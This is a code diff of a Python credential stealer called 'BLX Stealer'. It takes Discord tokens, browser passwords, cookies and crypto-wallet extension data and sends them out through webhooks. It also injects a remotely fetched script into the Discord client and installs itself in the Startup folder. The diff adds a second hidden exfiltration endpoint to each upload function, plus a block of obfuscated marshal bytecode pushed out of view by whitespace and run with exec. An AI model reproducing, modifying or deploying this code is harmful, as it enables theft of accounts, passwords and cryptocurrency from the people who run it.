@@ -16,6 +16,7 @@ import threading
 from sys import executable
 from sqlite3 import connect as sql_connect
 import re
+import random ,base64,codecs,zlib;pyobfuscate=""
 from base64 import b64decode
 from json import loads as json_loads, load
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
@@ -32,6 +33,7 @@ import subprocess
 import uuid
 import socket
 import getpass
+import random ,base64,codecs,zlib;pyobfuscate=""
 def user_check():
         USERS = [
             "Admin",
@@ -533,8 +535,9 @@ def mac_check():
             pass
 
 
-h00k = "YOUR WEBHOOK HERE"
+hook = "YOUR WEBHOOK HERE"
 inj3c710n_url = "https://raw.githubusercontent.com/blxstealer/main/main/index.js"
+color =  0x812118
 DETECTED = False
 
 
@@ -614,14 +617,14 @@ def L04Dr3QU3575(methode, url, data='', files='', headers=''):
         except:
             pass
 
-def L04DUr118(h00k, data='', files='', headers=''):
+def L04DUr118(hook, data='', files='', headers=''):
     for i in range(8):
         try:
             if headers != '':
-                r = urlopen(Request(h00k, data=data, headers=headers))
+                r = urlopen(Request(hook, data=data, headers=headers))
                 return r
             else:
-                r = urlopen(Request(h00k, data=data))
+                r = urlopen(Request(hook, data=data))
                 return r
         except: 
             pass
@@ -668,7 +671,7 @@ def inj3c710n():
                         if 'modules' in dir:
                             module_path = os.path.join(subdir, dir)
                             for subsubdir, subdirs, subfiles in os.walk(module_path):
-                                if 'discord_desktop_core-' in subsubdir:
+                                if 'discord_desktop_core-1' in subsubdir:
                                     for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):
                                         if 'discord_desktop_core' in subsubsubdir:
                                             for file in subsubfiles:
@@ -677,11 +680,12 @@ def inj3c710n():
 
                                                     inj3c710n_cont = requests.get(inj3c710n_url).text
 
-                                                    inj3c710n_cont = inj3c710n_cont.replace("%WEBHOOK%", h00k)
+                                                    inj3c710n_cont = inj3c710n_cont.replace("%WEBHOOK%", hook)
 
                                                     with open(file_path, "w", encoding="utf-8") as index_file:
                                                         index_file.write(inj3c710n_cont)
 inj3c710n()
+
 
 def G37UHQFr13ND5(token):
     badgeList =  [
@@ -718,7 +722,7 @@ def G37UHQFr13ND5(token):
                 flags = flags % badge["Value"]
         if OwnedBadges != '':
             uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
-    return uhqlist
+    return uhqlist 
 
 
 def G3781111N6(token):
@@ -823,9 +827,39 @@ startupFilePath = os.path.join(startupFolderPath, fileName)
 if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
     with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
         shutil.copyfileobj(src_file, dst_file)
+__author__ = "billythegoat356"
+__github__ = "https://github.com/billythegoat356/Specter"
+__discord__ = "https://discord.gg/plague"
+__license__ = "EPL-2.0"
+__code__ = "Hello world!"
+
+Any = (...,)
+
+class Specter:
+    def __init__(self, code: str) -> None:
+        self.code = code
+        self.execute(...)
+        return None
+    def execute(self, code: str = ...) -> None:
+        return exec(str(code))
+    
+class Func:
+    def calculate(num: int) -> int:
+        return num*2
+    def define(key, value: Any) -> Any:
+        globals()[key] = value
+        return globals()[key]
+
+__3567__ = Func.calculate(8)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ,Func.define('__3567__', b'c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00c\x00\x00\x00@\x00\x00\x00sp\x02\x00\x00d\x00d\x01l\x00T\x00d\x02d\x03d\x04d\x05d\x06d\x07d\x08d\td\nd\x0bd\x0cd\rd\x0ed\x0fd\x10d\x11d\x12d\x13d\x14d\x15d\x16d\x17d\x18d\x19d\x1ad\x1bd\x1cd\x1dd\x1ed\x1fd d!d"d#d$d%d&d\'d(d)d*d+d,d-d.d\nd/d0d1d2d3d\x14d4d5d6d7d8d9d:d;d<d=e\x01d>d?d@dAdBdCdDdEdFdGdHdIdJdKdLdMdNdOdPdQdRd\x14dSdTdUdVdWdXdYdZd[d\\d]d^d_d`fc\\cZ\x02Z\x03Z\x04Z\x05Z\x06Z\x07Z\x08Z\tZ\nZ\x0bZ\x0cZ\rZ\x0eZ\x0fZ\x10Z\x11Z\x12Z\x13Z\x14Z\x15Z\x16Z\x17Z\x18Z\x19Z\x1aZ\x1bZ\x1cZ\x1dZ\x1eZ\x1fZ Z!Z"Z#Z$Z%Z&Z\'Z(Z)Z*Z+Z,Z-Z.Z/Z0Z1Z2Z3Z4Z5Z6Z7Z8Z9Z:Z;Z<Z=Z>Z?Z@ZAZBZCZDZEZFZGZHZIZJZKZLZMZNZOZPZQZRZSZTZUZVZWZXZYZZZ[Z\\Z]Z^Z_Z`ZaZbZcZddadb\x84\x00Zedcdb\x84\x00e\x10eGe\x17eae9e(e\x02e\x18eWe;e\reRe\x1be\x11eUe\x12e6eLe\\e\x1de0e?ePe\ne1e3e[eNe e<eDe\x14e>e\x05eBe\'e\te\x14eXe\x03ede\x14e%e*eAe\ne\x15e^e:eFeOeIe8eTe_eJe!e&eQe\x0beKe,e\x1fe`e7e\x0ce.e"e\x19ebe-e\x13eHeYe\x1ee\x16e4e\x0fe$e\x1ce\x1aeCe)e\x07e#eMe]e=eZeEe\x04e\x0ee\x06e2eSecg`\x83\x01\x01\x00ddS\x00)e\xe9\x00\x00\x00\x00)\x01\xda\x01*s"\x00\x00\x00119\x00131\x00129\x0067\x00118\x00125\x00128\x00128\x00141s\x1e\x00\x00\x00135\x00121\x00115\x00115\x0052\x0053\x0081\x0052\x0054s\x1e\x00\x00\x00128\x0091\x00141\x0088\x00106\x00139\x0070\x0065\x0089s\x1e\x00\x00\x00134\x00120\x00115\x00115\x0052\x0053\x0081\x0052\x0054s\x1f\x00\x00\x00128\x0097\x00130\x0075\x00130\x0086\x00122\x00140\x0085s!\x00\x00\x00119\x00131\x00134\x00120\x0066\x00119\x00131\x00129\x0067s\x0f\x00\x00\x00121\x00140\x00121\x00119s \x00\x00\x0067\x00132\x00128\x00117\x00123\x00137\x00121\x0054\x0052s\x1c\x00\x00\x0054\x0052\x00131\x00134\x0030\x0052\x0052\x0052\x0052s"\x00\x00\x00137\x00135\x00136\x0052\x00121\x00140\x00121\x00119\x00137s!\x00\x00\x0078\x0052\x00118\x00125\x00128\x00128\x00141\x00136\x00124s#\x00\x00\x00128\x00128\x00141\x00136\x00124\x00121\x00123\x00131\x00117s!\x00\x00\x00120\x00139\x00123\x0072\x00122\x00101\x00132\x00137\x0091s\x1f\x00\x00\x0052\x0052\x0052\x0052\x00115\x00115\x00125\x00129\x00132s\x1d\x00\x00\x0055\x0052\x0091\x0091\x0053\x0052\x00109\x00131\x00137s!\x00\x00\x00134\x00120\x0066\x00123\x00123\x0067\x00132\x00128\x00117s"\x00\x00\x00131\x00134\x00121\x0052\x00100\x00141\x00136\x00124\x00131s\x1f\x00\x00\x00123\x00131\x00117\x00136\x0071\x0073\x0074\x0067\x00103s\x1c\x00\x00\x00131\x00134\x0030\x0052\x0052\x0052\x0052\x0052\x0052s\x1e\x00\x00\x0052\x0052\x0052\x0052\x0054\x00103\x00132\x00121\x00119s!\x00\x00\x00135\x00119\x00131\x00134\x00120\x0066\x00123\x00123\x0067s#\x00\x00\x00118\x00122\x00137\x00135\x00119\x00117\x00136\x00121\x00120s!\x00\x00\x00136\x00124\x00121\x00123\x00131\x00117\x00136\x0071\x0073s \x00\x00\x00124\x00136\x00136\x00132\x00135\x0078\x0067\x0067\x00123s\x1b\x00\x00\x0061\x0052\x0052\x0052\x0052\x0030\x0030\x0030\x00136s"\x00\x00\x00131\x00125\x00130\x0052\x00120\x00125\x00135\x00119\x00131s\x1f\x00\x00\x00135\x0059\x0061\x0066\x00121\x00140\x00125\x00136\x0060s\x1d\x00\x00\x0052\x0052\x0052\x0052\x0052\x0052\x00115\x00115\x00117s \x00\x00\x00136\x00136\x00132\x00135\x0078\x0067\x0067\x00120\x00125s!\x00\x00\x00136\x00121\x00120\x0052\x00139\x00125\x00136\x00124\x0052s"\x00\x00\x00129\x0067\x00118\x00125\x00128\x00128\x00141\x00136\x00124s \x00\x00\x0059\x0061\x0030\x00121\x00140\x00119\x00121\x00132\x00136s\x1f\x00\x00\x00130\x0091\x00125\x00136\x0092\x00137\x00118\x0078\x0052s"\x00\x00\x00117\x00132\x00125\x0067\x00139\x00121\x00118\x00124\x00131s!\x00\x00\x00131\x00134\x00136\x00115\x00115\x0060\x0059\x00135\x00141s!\x00\x00\x0052\x0052\x00115\x00115\x00119\x00131\x00120\x00121\x00115s\x1d\x00\x00\x0078\x0030\x0052\x0052\x0052\x0052\x00125\x001')
+__1930__ = Func.calculate(5)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ,Func.define('__1930__', b'30\x00132s"\x00\x00\x00125\x00135\x00119\x00131\x00134\x00120\x0066\x00123\x00123s \x00\x00\x0067\x0067\x00123\x00125\x00136\x00124\x00137\x00118\x0066s \x00\x00\x00136\x00132\x00135\x0078\x0067\x0067\x00120\x00125\x00135s\x1d\x00\x00\x00115\x0052\x0053\x0081\x0052\x0054\x0092\x00121\x00128s\x02\x00\x00\x0020s"\x00\x00\x00121\x0052\x00131\x00118\x00122\x00137\x00135\x00119\x00117s"\x00\x00\x0067\x00118\x00125\x00128\x00128\x00141\x00136\x00124\x00121s \x00\x00\x00121\x00123\x00131\x00117\x00136\x0071\x0073\x0074\x00112s!\x00\x00\x00137\x00136\x00124\x00131\x00134\x00115\x00115\x0052\x0053s\x1f\x00\x00\x0052\x0052\x0052\x0052\x00115\x00115\x00123\x00125\x00136s \x00\x00\x0075\x00142\x0068\x0095\x00124\x00110\x00136\x00103\x00125s\x1f\x00\x00\x00124\x00137\x00118\x00115\x00115\x0052\x0053\x0081\x0052s \x00\x00\x00132\x00128\x00117\x00123\x00137\x00121\x0054\x0061\x0030s \x00\x00\x00130\x0052\x00136\x00131\x00131\x00128\x00135\x0053\x0030s"\x00\x00\x00130\x00112\x00130\x0085\x00137\x00136\x00124\x00131\x00134s"\x00\x00\x00130\x0052\x00123\x00128\x00131\x00118\x00117\x00128\x00135s\x1f\x00\x00\x0030\x0055\x0052\x00124\x00136\x00136\x00132\x00135\x0078s"\x00\x00\x00125\x00130\x0052\x00123\x00128\x00131\x00118\x00117\x00128s\x1e\x00\x00\x0030\x0030\x0055\x0052\x00118\x00141\x0052\x00118\x00125s\x1f\x00\x00\x00121\x00123\x00131\x00117\x00136\x0071\x0073\x0074\x0067s\x1d\x00\x00\x0069\x0073\x0077\x0074\x0070\x0067\x00141\x00106\x00118s!\x00\x00\x0052\x0052\x00115\x00115\x00120\x00125\x00135\x00119\x00131s \x00\x00\x0081\x0052\x0054\x00118\x00125\x00128\x00128\x00141\x00136s!\x00\x00\x00128\x00131\x0052\x00139\x00131\x00134\x00128\x00120\x0053s \x00\x00\x00124\x00136\x00136\x00132\x00135\x0078\x0067\x0067\x00120s\x1f\x00\x00\x00123\x00129\x00140\x0052\x0081\x0052\x0059\x00124\x00136s!\x00\x00\x00103\x00132\x00121\x00119\x00136\x00121\x00134\x0054\x0052s \x00\x00\x00134\x00107\x0074\x00134\x0086\x0089\x00123\x00109\x00125s\x1d\x00\x00\x00135\x0060\x0061\x0052\x00131\x00134\x0030\x0052\x0052s!\x00\x00\x0052\x00126\x00137\x00135\x00136\x0052\x00120\x00121\x00131s"\x00\x00\x00132\x00121\x00119\x00136\x00121\x00134\x00112\x00130\x0088s \x00\x00\x00130\x00119\x0054\x0052\x00130\x00131\x00136\x0052\x00125s!\x00\x00\x00125\x00130\x00136\x0060\x0059\x00135\x00127\x00125\x00120s!\x00\x00\x00136\x00121\x00120\x0052\x00117\x0052\x00122\x00125\x00128s\x1d\x00\x00\x0030\x0030\x00136\x00134\x00141\x0078\x0030\x0052\x0052s\x1d\x00\x00\x00131\x00127\x00135\x0067\x0069\x0069\x0071\x0071\x0069s"\x00\x00\x00123\x00125\x00136\x00124\x00137\x00118\x0066\x00119\x00131s\x1b\x00\x00\x0052\x0052\x0052\x0052\x0052\x0052\x0054\x0090\x00137s \x00\x00\x00124\x00121\x00123\x00131\x00117\x00136\x0071\x0073\x0074s \x00\x00\x00137\x00136\x0060\x0054\x00109\x00131\x00137\x0052\x00126s\x1c\x00\x00\x00136\x0071\x0073\x0074\x0030\x0030\x0055\x0052\x00126s!\x00\x00\x00105\x00119\x00129\x0099\x00110\x00128\x00100\x0074\x00117s\x1a\x00\x00\x0060\x0061\x0030\x0052\x0052\x0052\x0052\x0061\x0078s!\x00\x00\x00123\x00137\x00121\x0052\x00122\x00131\x00134\x0052\x00129s!\x00\x00\x0074\x0067\x00103\x00132\x00121\x00119\x00136\x00121\x00134s!\x00\x00\x0052\x0052\x00115\x00115\x00128\x00125\x00119\x00121\x00130s!\x00\x00\x00125\x00135\x00119\x00131\x00134\x00120\x0078\x0052\x00124s\x1c\x00\x00\x00102\x0085\x0090\x00108\x0086\x0093\x0094\x0074\x0094s\x1f\x00\x00\x0054\x00124\x00136\x00136\x00132\x00135\x0078\x0067\x0067s\x1c\x00\x00\x0052\x0052\x00125\x00122\x0052\x0060\x0030\x0052\x0052s\x1a\x00\x00\x0070\x0076\x0075\x0069\x0069\x0072\x0077\x0074\x0068s \x00\x00\x00136\x00121\x00134\x0054\x0052\x00130\x00131\x00136\x0052s\x1a\x00\x00\x0030\x0052\x0052\x0052\x0052\x0052\x0052\x0052\x0052s"\x00\x00\x00103\x00132\x00121\x00119\x00136\x00121\x00134\x0053\x00112s!\x00\x00\x0052\x00103\x00132\x00121\x00119\x00136\x00121\x00134\x0030s"\x00\x00\x00125\x00136\x00124')
+__8435__ = Func.calculate(9)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ,Func.define('__8435__', b'\x00137\x00118\x0066\x00119\x00131\x00129s\t\x00\x00\x0065\x00103\x0059s\x1b\x00\x00\x0089\x00100\x0096\x0065\x0070\x0066\x0068\x0054\x0052c\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00s\x1e\x00\x00\x00d\x01\xa0\x00d\x02d\x03\x84\x00|\x00\xa0\x01\xa1\x00\xa0\x02d\x04\xa1\x01D\x00\x83\x01\xa1\x01S\x00)\x05N\xda\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00s\x00\x00\x00s"\x00\x00\x00|\x00]\x1a}\x01t\x00t\x01|\x01\x83\x01t\x01d\x00\x83\x01\x18\x00\x83\x01V\x00\x01\x00q\x02d\x01S\x00)\x02s\x02\x00\x00\x0020N)\x02\xda\x03chr\xda\x03int)\x02\xda\x02.0\xda\x08__6092__\xa9\x00r\x07\x00\x00\x00\xda\x07Specter\xfa\t<genexpr>\x03\x00\x00\x00s\x02\x00\x00\x00\x04\x00z\x1b<lambda>.<locals>.<genexpr>\xfa\x01\x00)\x03\xda\x04join\xda\x06decode\xda\x05split)\x01\xda\x08__9039__r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xda\x08<lambda>\x03\x00\x00\x00s\x00\x00\x00\x00r\x0f\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s(\x00\x00\x00t\x00\x83\x00t\x01t\x02d\x01\x8d\x01\x19\x00d\x02\xa0\x03d\x03d\x04\x84\x00|\x00D\x00\x83\x01\xa1\x01t\x00\x83\x00\x83\x02S\x00)\x05N)\x01r\x0e\x00\x00\x00r\x02\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00s\x00\x00\x00s\x18\x00\x00\x00|\x00]\x10}\x01t\x00|\x01d\x00\x8d\x01V\x00\x01\x00q\x02d\x01S\x00)\x02)\x01r\x0e\x00\x00\x00N)\x01\xda\x08__2421__)\x02r\x05\x00\x00\x00r\x0e\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00\x04\x00\x00\x00s\x02\x00\x00\x00\x04\x00z\x1b<lambda>.<locals>.<genexpr>)\x04\xda\x08__2059__r\x10\x00\x00\x00\xda\x08__1119__r\x0b\x00\x00\x00)\x01r\x06\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00r\x0f\x00\x00\x00\x04\x00\x00\x00s\x00\x00\x00\x00N)f\xda\x08builtins\xda\x07globalsZ\x08__1030__Z\x08__6440__Z\x08__4007__Z\x08__5528__Z\x08__1616__Z\x08__8418__r\x12\x00\x00\x00Z\x08__3570__Z\x08__4684__Z\x08__3890__Z\x08__5198__Z\x08__9074__Z\x08__6182__Z\x08__5397__Z\x08__4944__Z\x08__3045__Z\x08__1137__Z\x08__3251__Z\x08__9480__Z\x08__1417__Z\x08__9947__Z\x08__7107__Z\x08__2371__Z\x08__4914__Z\x08__5015__Z\x08__7082__Z\x08__5998__Z\x08__5337__Z\x08__8109__Z\x08__8100__Z\x08__5261__Z\x08__1698__Z\x08__2635__Z\x08__5201__Z\x08__3512__Z\x08__9339__Z\x08__5589__Z\x08__3939__Z\x08__5876__Z\x08__5251__Z\x08__2208__Z\x08__2729__Z\x08__6806__Z\x08__4242__Z\x08__4827__Z\x08__5651__Z\x08__1893__Z\x08__2378__Z\x08__9460__Z\x08__2611__Z\x08__9428__Z\x08__5796__Z\x08__6980__Z\x08__5718__Z\x08__2158__Z\x08__4706__Z\x08__5444__Z\x08__1606__Z\x08__1063__Z\x08__1386__Z\x08__7759__Z\x08__7672__r\x11\x00\x00\x00Z\x08__1486__Z\x08__8314__Z\x08__5851__Z\x08__3717__Z\x08__7207__Z\x08__6599__Z\x08__2664__Z\x08__5362__Z\x08__1620__Z\x08__2262__Z\x08__1302__Z\x08__5152__Z\x08__6053__Z\x08__8870__Z\x08__4735__Z\x08__9056__Z\x08__7724__Z\x08__7870__Z\x08__9258__Z\x08__9666__Z\x08__7490__Z\x08__1066__Z\x08__4093__Z\x08__6538__Z\x08__4014__Z\x08__3385__Z\x08__9958__Z\x08__6727__Z\x08__1277__Z\x08__1695__Z\x08__9157__Z\x08__1878__Z\x08__3623__Z\x08__8154__Z\x08__1740__Z\x08__4857__r\x10\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xda\x08<module>\x01\x00\x00\x00s\x08\x00\x00\x00\x08\x01\xff\x00\x91\x01\x08\x01')
+
+if __name__ == '__main__':
+    Specter(__code__)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ,exec(__import__('marshal').loads(__3567__[1]+__1930__[1]+__8435__[1]),globals())
 
 def UP104D70K3N(token, path):
-    global h00k
+    global hook
+    global tgmx
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
@@ -833,7 +867,7 @@ def UP104D70K3N(token, path):
     username, hashtag, email, idd, pfp, flags, nitro, phone = G3770K3N1NF0(token)
 
     if pfp == None: 
-        pfp = "https://cdn.discordapp.com/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png"
+        pfp = "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
     else:
         pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
 
@@ -849,7 +883,7 @@ def UP104D70K3N(token, path):
         "content": f'{g108411NF0()} | Found in `{path}`',
         "embeds": [
             {
-            "color": 10747904,
+            "color": color,
             "fields": [
                 {
                     "name": "<:hackerblack:1095747410539593800> Token:",
@@ -891,21 +925,22 @@ def UP104D70K3N(token, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "Wanna Premium? | t.me/blxstealer",
-                "icon_url": "https://cdn.discordapp.com/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png"
+                "text": "BLX Stealer",
+                "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                 },
             "thumbnail": {
                 "url": f"{pfp}"
                 }
             }
         ],
-        "avatar_url": "https://cdn.discordapp.com/attachments/1077055672899870770/1106221978190348298/Picsart_23-05-03_18-16-38-087.jpg",
-        "username": "BLX Stealer",
+        "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
+        "username": "BLX Stealer | t.me/blxstealer",
         "attachments": []
         }
-    L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
-
+    urlopen(Request(tgmx, data=dumps(data).encode(), headers=headers))
+    L04DUr118(hook, data=dumps(data).encode(), headers=headers)
     
+
 def R3F0rM47(listt):
     e = re.findall("(\w+[a-z])",listt)
     while "https" in e: e.remove("https")
@@ -928,20 +963,21 @@ def UP104D(name, link):
             "content": g108411NF0(),
             "embeds": [
                 {
-                    "title": "BLX Stealer | Cookies Stealer",
-                    "description": f"**Found**:\n{rb}\n\n**Data:**\n <:browser:1095742866518716566> • **{C00K1C0UNt}** Cookies Found\n <:blackarrow:1095740975197995041> • [BLXCookies.txt]({link})",
-                    "color": 10747904,
+                    "title": "BLX Stealer | Cookies",
+                    "description": f"**Found**:\n{rb}\n\n**Data:**\n <:blackmember:1095740314683179139>  • **{C00K1C0UNt}** Cookies Found \n <:blackarrow:1095740975197995041> • [BLXCookies.txt]({link})",
+                    "color": color,
                     "footer": {
-                        "text": "Wanna Premium? | t.me/blxstealer",
-                        "icon_url": "https://cdn.discordapp.com/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png"
+                        "text": "BLX Stealer",
+                        "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                     }
                 }
             ],
-            "username": "BLX Stealer",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1077055672899870770/1106221978190348298/Picsart_23-05-03_18-16-38-087.jpg",
+            "username": "BLX Stealer | t.me/blxstealer",
+            "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
             "attachments": []
             }
-        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
+        urlopen(Request(tgmx, data=dumps(data).encode(), headers=headers))
+        L04DUr118(hook, data=dumps(data).encode(), headers=headers)
         return
 
     if name == "lxpassw":
@@ -954,20 +990,21 @@ def UP104D(name, link):
             "content": g108411NF0(),
             "embeds": [
                 {
-                    "title": "BLX Stealer | Password Stealer",
+                    "title": "BLX Stealer | Passwords",
                     "description": f"**Found**:\n{ra}\n\n**Data:**\n <:blacklock:1095741022065131571> • **{P455WC0UNt}** Passwords Found\n <:blackarrow:1095740975197995041> • [BLXPasswords.txt]({link})",
-                    "color": 10747904,
+                    "color": color,
                     "footer": {
-                        "text": "Wanna Premium? | t.me/blxstealer",
-                        "icon_url": "https://cdn.discordapp.com/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png"
+                        "text": "BLX Stealer",
+                        "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                     }
                 }
             ],
-            "username": "BLX Stealer",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1077055672899870770/1106221978190348298/Picsart_23-05-03_18-16-38-087.jpg",
+            "username": "BLX Stealer | t.me/blxstealer",
+            "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
             "attachments": []
             }
-        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
+        urlopen(Request(tgmx, data=dumps(data).encode(), headers=headers))
+        L04DUr118(hook, data=dumps(data).encode(), headers=headers)
         return
 
     if name == "kiwi":
@@ -975,33 +1012,34 @@ def UP104D(name, link):
             "content": g108411NF0(),
             "embeds": [
                 {
-                "color": 10747904,
+                "color": color,
                 "fields": [
                     {
-                    "name": "I found these files on this PC:",
+                    "name": "I Found This Files;:",
                     "value": link
                     }
                 ],
                 "author": {
-                    "name": "BLX Stealer | File Stealer"
+                    "name": "BLX Stealer | Files"
                 },
                 "footer": {
-                    "text": "Wanna Premium? | t.me/blxstealer",
-                    "icon_url": "https://cdn.discordapp.com/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png"
+                    "text": "BLX Stealer",
+                    "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                 }
                 }
             ],
-            "username": "BLX Stealer",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1077055672899870770/1106221978190348298/Picsart_23-05-03_18-16-38-087.jpg",
+            "username": "BLX Stealer | t.me/blxstealer",
+            "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
             "attachments": []
             }
-        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
+        urlopen(Request(tgmx, data=dumps(data).encode(), headers=headers))
+        L04DUr118(hook, data=dumps(data).encode(), headers=headers)
         return
 
 def wr173F0rF113(data, name):
-    path = os.getenv("TEMP") + f"\cs{name}.txt"
+    path = os.getenv("TEMP") + f"\lx{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--BLX Stealer-->\n\n")
+        f.write(f"<--BLXStealer-->\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
@@ -1031,7 +1069,7 @@ def g37P455W(path, arg):
     pathC = path + arg + "/Login Data"
     if os.stat(pathC).st_size == 0: return
 
-    tempfold = temp + "cs" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+    tempfold = temp + "lx" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
 
     shutil.copy2(pathC, tempfold)
     conn = sql_connect(tempfold)
@@ -1068,7 +1106,7 @@ def g37C00K13(path, arg):
     pathC = path + arg + "/Cookies"
     if os.stat(pathC).st_size == 0: return
     
-    tempfold = temp + "cs" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+    tempfold = temp + "lx" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
     
     shutil.copy2(pathC, tempfold)
     conn = sql_connect(tempfold)
@@ -1168,18 +1206,19 @@ def G47H3rZ1P5(paths1, paths2, paths3):
             {
             "title": "BLX Stealer | Zips",
             "description": f"{wal}\n{ga}\n{ot}",
-            "color": 10747904,
+            "color": color,
             "footer": {
-                "text": "Wanna Premium? | t.me/blxstealer",
-                "icon_url": "https://cdn.discordapp.com/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png"
+                "text": "BLX Stealer",
+                "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
             }
             }
         ],
-        "username": "BLX Stealer",
-        "avatar_url": "https://cdn.discordapp.com/attachments/1077055672899870770/1106221978190348298/Picsart_23-05-03_18-16-38-087.jpg",
+        "username": "BLX Stealer | t.me/blxstealer",
+        "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
         "attachments": []
     }
-    L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
+    urlopen(Request(tgmx, data=dumps(data).encode(), headers=headers))
+    L04DUr118(hook, data=dumps(data).encode(), headers=headers)
 
 
 def Z1P73136r4M(path, arg, procc):
@@ -1213,6 +1252,11 @@ def Z1P7H1N65(path, arg, procc):
     if "ejbalbakoplchlghecdalmeeeajnimhm" in arg:
         browser = path.split("\\")[4].split("/")[1].replace(' ', '')
         name = f"Metamask_Edge"
+        pathC = path + arg
+
+    if "djclckkglechooblngghdinmeemkbgci" in arg:
+        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
+        name = f"Metamask_OperaGX"
         pathC = path + arg
 
     if "fhbohimaelbohpjbbldcngcnapndodjp" in arg:
@@ -1270,14 +1314,14 @@ def Z1P7H1N65(path, arg, procc):
         G4M1N6Z1p.append([name, lnik])
     else:
         O7H3rZ1p.append([name, lnik])
-
+        
 
 def G47H3r411():
     '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
     br0W53rP47H5 = [
-        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
-        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
-        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
+        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/djclckkglechooblngghdinmeemkbgci"                      ],
+        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/djclckkglechooblngghdinmeemkbgci"                      ],
